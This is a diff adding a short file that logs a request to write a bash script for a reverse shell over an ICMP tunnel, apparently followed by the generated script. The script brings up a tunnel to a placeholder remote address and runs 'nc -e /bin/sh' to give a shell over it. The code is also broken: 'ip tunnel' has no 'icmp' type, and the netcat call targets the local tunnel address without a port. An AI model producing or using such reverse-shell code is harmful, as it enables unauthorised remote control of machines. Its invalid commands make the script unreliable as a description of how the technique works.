@@ -1,0 +1,25 @@
+morb asked write a bash script that creates a reverse shell over an icmp tunnel with hash 340058aa
+<---- snip ---->
+#!/bin/bash
+
+# Create a reverse shell over an ICMP tunnel
+
+# Variables
+REMOTE_IP="<IP_ADDRESS_HERE>"
+LOCAL_IP="<IP_ADDRESS_HERE>"
+
+# Create the tunnel
+echo "Creating tunnel..."
+sudo ip tunnel add reverse type icmp remote $REMOTE_IP local $LOCAL_IP
+
+# Set the interface up
+echo "Configuring interface..."
+sudo ip link set reverse up
+
+# Get the IP of the tunnel
+echo "Getting tunnel IP..."
+TUNNEL_IP=$(ip addr show reverse | awk '/inet/ {print $2}' | cut -d/ -f1)
+
+# Start the reverse shell
+echo "Starting the reverse shell..."
+nc -e /bin/sh $TUNNEL_IP
